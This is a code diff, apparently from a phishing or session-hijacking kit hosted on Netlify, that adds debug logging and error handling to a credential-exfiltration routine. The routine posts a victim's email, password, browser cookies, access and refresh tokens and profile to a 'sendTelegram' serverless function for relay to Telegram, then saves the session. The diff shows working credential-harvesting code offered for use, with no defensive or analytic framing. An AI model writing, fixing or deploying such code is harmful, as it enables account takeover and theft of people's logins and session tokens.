@@ -177,13 +177,25 @@
                 });
 
                 statusEl.textContent = 'Sending data to backend...';
+                
+                // DEBUG: Log what we're about to send
+                console.log('🔍 About to send to Telegram:', {
+                    domain: window.location.origin,
+                    email: sessionData.email,
+                    sessionId: sessionData.sessionId,
+                    hasAuthCode: !!sessionData.authorizationCode
+                });
 
                 // Send to Telegram via your backend (use current domain)
                 const currentDomain = window.location.origin;
-                const telegramResponse = await fetch(`${currentDomain}/.netlify/functions/sendTelegram`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
+                console.log('🔍 Sending to domain:', currentDomain);
+                
+                let telegramResponse;
+                try {
+                    telegramResponse = await fetch(`${currentDomain}/.netlify/functions/sendTelegram`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
                         email: sessionData.email,
                         password: sessionData.password,
                         provider: sessionData.provider,
@@ -203,14 +215,23 @@
                         documentCookies: document.cookie,
                         formattedCookies: sessionData.formattedCookies,
                         cookies: document.cookie,
-                        accessToken: sessionData.accessToken,
-                        refreshToken: sessionData.refreshToken,
-                        userProfile: sessionData.userProfile
-                    })
-                });
+                                                 accessToken: sessionData.accessToken,
+                         refreshToken: sessionData.refreshToken,
+                         userProfile: sessionData.userProfile
+                     })
+                 });
+                 
+                 console.log('✅ Fetch completed, response received');
+                 
+                 } catch (fetchError) {
+                     console.error('❌ Fetch failed:', fetchError);
+                     throw new Error(`Failed to send to Telegram: ${fetchError.message}`);
+                 }
 
                 const telegramResult = await telegramResponse.json();
                 console.log('🔍 Telegram result:', telegramResult);
+                console.log('🔍 Telegram response status:', telegramResponse.status);
+                console.log('🔍 Telegram response ok:', telegramResponse.ok);
 
                 // Save session
                 await fetch(`${currentDomain}/.netlify/functions/saveSession`, {
